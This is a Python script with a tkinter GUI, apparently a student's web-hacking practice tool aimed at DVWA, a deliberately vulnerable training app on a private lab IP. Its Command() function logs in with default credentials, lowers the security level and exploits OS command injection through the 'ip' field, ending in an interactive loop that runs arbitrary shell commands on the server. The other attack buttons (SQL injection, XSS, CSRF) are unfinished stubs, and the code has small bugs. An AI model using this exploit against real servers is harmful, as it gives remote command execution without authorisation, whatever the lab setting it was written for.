import tkinter as tk
from tkinter.constants import W
import pyautogui
import time
import pyperclip, pyautogui
from tkinter import Entry, messagebox
import re
import sys
import os
import requests
from bs4 import BeautifulSoup

proxies = {'http':'http://localhost:9000', 'https': 'https://localhost:9000'}
url ='http://192.168.10.134'

root = tk.Tk()
root.geometry("400x400")
root.configure(bg='white')
root.title("WebHacking.dp")
labelExample = tk.Label(root, text="",height = 2,bg = "white")
labelExample2 = tk.Label(root, text="웹 해킹 기법",font = ("맑은 고딕",15),fg ="black",bg = "white",height = 2)
labelExample3 = tk.Label(root, text="",height = 1,bg = "white")
labelExample.pack()
labelExample2.pack()
labelExample3.pack()

frame = tk.Frame(root,bg = 'black')
frame.pack()

def Command():
    # 1) Login attempt
    # Mothod: POST
    # URL: "/dvwa/login.php"
    # data: "username=admin&password=password&Login=Login"
    # OK_MESS: "Welcome to Damn Vulnerable Web App"
    login_url = url + '/dvwa/login.php'
    login_data = {'username': 'admin', 'password': 'password', 'Login': 'Login'}
    s = requests.Session()
    resp = s.post(login_url, data=login_data, proxies=proxies)
    # print(resp.text)
    soup = BeautifulSoup(resp.text, 'lxml')
    OK_MESS = 'Welcome to Damn Vulnerable Web App'
    FIND_MESS = soup.h1.string
    if re.search(OK_MESS,FIND_MESS):
        print("[+] Login Success")
    else:
        print("[-] Login Failed")
        sys.exit(1)

    # 2) Security level set to low
    # Method: POST
    # URL: "/dvwa/security.php"
    # Data: "security=low&seclev_submit=Submit"
    # OK_MESS: "Security level set to low"
    security_url = url + '/dvwa/security.php'
    security_data = {'security': 'low', 'seclev_submit': 'Submit'}
    resp = s.post(security_url, data=security_data, proxies=proxies)
    # print(resp.text)
    soup = BeautifulSoup(resp.text, 'lxml')
    FIND_MESS = soup.find_all('div', class_='message')
    OK_MESS = 'Security level set to low'
    if re.search(OK_MESS, str(FIND_MESS)):
        print("[+] Security level is Low")
    else:
        print("[-] Security level is not set to Low")
        sys.exit(2)

    # 3) OS command injection
    # 3-1) Command execution possible
    # Method: POST
    # URL: "/dvwa/vulnerabilities/exec/"
    # Data: "ip=127.0.0.1;+id&submit=submit"
    # Vulnerable: "127.0.0.1; CMD"
    # OK_MESS: "groups="
    command_url = url +'/dvwa/vulnerabilities/exec/'

    CMD = 'id'
    command_sub_data = '127.0.0.1;' + CMD
    command_data = {'ip': command_sub_data, 'submit': 'submit'}

    resp = s.post(command_url, data=command_data, proxies=proxies)
    soup = BeautifulSoup(resp.text, 'lxml')
    FIND_MESS = soup.pre.string
    OK_MESS = 'groups='
    if re.search(OK_MESS, FIND_MESS):
        print("[+] Command Injection is possible.")
    else:
        print("[-] Command Injection is impossible.")

    # 3-2) Command execution attack code
    tmp1 = 'command_output.txt'
    while True:
        CMD = input("Enter your command: (CMD|q): ")
        if CMD == 'q':
            break
        print("========== command output ==========")

        command_sub_data = '127.0.0.1;' + CMD
        command_data = {'ip': command_sub_data, 'submit': 'submit'}

        resp = s.post(command_url, data=command_data, proxies=proxies)
        soup = BeautifulSoup(resp.text, 'lxml')
        # print(soup.pre.string)

        fd1 = open(tmp1, 'w')
        fd1.write(soup.pre.string)
        fd1.close()

        CMD2 = "cat %s | tail -n +9" % (tmp1)
        os.system(CMD2)
        print("================================")
        print("\n")

    if os.path.exits(tmp1):
        os.remove(tmp1)

def createNewWindow():
    def callback(event):
        print(text_entry.get())
    def callback2():
        print(text_entry.get())

    newWindow = tk.Toplevel(root)
    newWindow.geometry("400x400")
    newWindow.configure(bg='white')
    newWindow.bind('<Return>', callback)
 
    commandLabel = tk.Label(newWindow, text="URL : ",font = ("맑은 고딕",9),fg ="black",bg = "white",height = 1)
    commandLabel.place(x=10,y=50)

    text_entry = Entry(newWindow)
    text_entry = tk.Entry(newWindow, width = 20, bg = 'black', fg = 'white')
    text_entry.insert(0,"")
    text_entry.place(x=50,y=50)

    buttonn = Entry(newWindow)
    buttonn = tk.Button(newWindow, text = "확인", command = callback2)
    buttonn.place(x=200,y=45)

    root.mainloop()

def button():
    Hacking="Command Exeution"
    Text='Command Exeution'
    button = tk.Button(frame, text = Text, command = createNewWindow, width=20,bg="black",fg="white")
    button.pack(pady = 2)
def button2():
    button2 = tk.Button(frame, text = 'CSRF', command = createNewWindow, width=20,bg="black",fg="white")
    button2.pack(pady = 2)
    Hacking="CSRF"
def button3():
    button3 = tk.Button(frame, text = 'File Inclusion', command = createNewWindow, width=20,bg="black",fg="white")
    button3.pack(pady = 2)
    Hacking="File Inclusion"
def button4():
    button4 = tk.Button(frame, text = 'SQL Injection', command = createNewWindow, width=20,bg="black",fg="white")
    button4.pack(pady = 2)
    Hacking="SQL Injection"
def button5():
    button5 = tk.Button(frame, text = 'SQL Injection (Blind)', command = createNewWindow, width=20,bg="black",fg="white")
    button5.pack(pady = 2)
    Hacking="SQL Injection (Blind)"
def button6():
    button6 = tk.Button(frame, text = 'Upload', command = createNewWindow, width=20,bg="black",fg="white")
    button6.pack(pady = 2)
    Hacking="Upload"
def button7():
    button7 = tk.Button(frame, text = 'XSS reflected', command = createNewWindow, width=20,bg="black",fg="white")
    button7.pack(pady = 2)
    Hacking="XSS reflected"
def button8():
    button8 = tk.Button(frame, text = 'XSS stored', command = createNewWindow, width=20,bg="black",fg="white")
    button8.pack(pady = 2)
    Hacking="XSS stored"

button(),button2(),button3(),button4(),button5(),button6(),button7(),button8()

def on_closing():
    if messagebox.askokcancel("종료 여부", "종료하시겠습니까?"):
        root.destroy()

root.protocol("WM_DELETE_WINDOW", on_closing)

root.mainloop()